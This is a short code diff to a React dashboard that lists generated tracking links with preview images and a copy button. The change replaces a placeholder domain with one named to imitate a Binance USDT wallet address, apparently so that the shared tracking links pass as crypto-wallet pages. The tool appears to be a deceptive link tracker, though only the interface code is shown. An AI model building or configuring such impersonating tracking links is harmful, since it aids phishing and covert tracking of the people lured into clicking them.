@@ -108,8 +108,8 @@ export default function Dashboard() {
                     <img src={`${FLASK_API}/uploads/${link.preview_path}`} alt="Preview" className="w-full h-24 object-cover rounded-md mb-3" />
                     <p className="text-xs text-zinc-500 mb-1">Tracking URL:</p>
                     <div className="flex items-center gap-2 bg-zinc-950 p-2 rounded border border-zinc-800">
-                      <input readOnly value={`https://your-vercel-app.vercel.app/track/${link.id}`} className="bg-transparent text-xs text-zinc-400 w-full outline-none" />
-                      <button onClick={() => navigator.clipboard.writeText(`https://your-vercel-app.vercel.app/track/${link.id}`)} className="text-blue-400 hover:text-blue-300 text-xs">Copy</button>
+                     <input readOnly value={`https://binanceassetswallet-usdt-walletaddr.vercel.app/track/${link.id}`} className="bg-transparent text-xs text-zinc-400 w-full outline-none" />
+                     <button onClick={() => navigator.clipboard.writeText(`https://binanceassetswallet-usdt-walletaddr.vercel.app/track/${link.id}`)} className="text-blue-400 hover:text-blue-300 text-xs">Copy</button>
                     </div>
                   </div>
                 ))}
